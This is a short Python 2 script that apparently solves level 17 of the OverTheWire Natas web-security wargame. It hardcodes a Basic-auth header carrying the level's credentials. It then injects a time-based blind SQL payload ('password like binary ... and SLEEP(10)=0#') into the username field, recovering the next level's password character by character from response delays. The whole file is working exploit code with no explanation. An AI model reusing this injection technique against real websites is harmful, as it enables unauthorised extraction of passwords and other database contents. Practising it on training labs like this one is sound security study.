import urllib2
import urllib
import time
import sys

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
headers={'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='}
request = urllib2.Request('http://natas17.natas.labs.overthewire.org', headers=headers)
response = urllib2.urlopen(request)
response.close()

found = '' if len(sys.argv) == 1 else sys.argv[1]
for i in range(len(found), 32):
    for j in range(len(chars)):
        attempt = found + chars[j]
        username = 'natas18" and password like binary "' + attempt + '%" and SLEEP(10)=0#'
        post_data = urllib.urlencode({'username' : username})
        url = "http://natas17.natas.labs.overthewire.org/"
        before = time.time()
        request = urllib2.Request(url, data=post_data, headers=headers)
        response = urllib2.urlopen(request)
        result = response.read()
        after = time.time()
        if after - before > 6:
            found = attempt
            break
        response.close()
        time.sleep(0.2)
        sys.stdout.write('.')
        sys.stdout.flush()
    print('\n' + found)
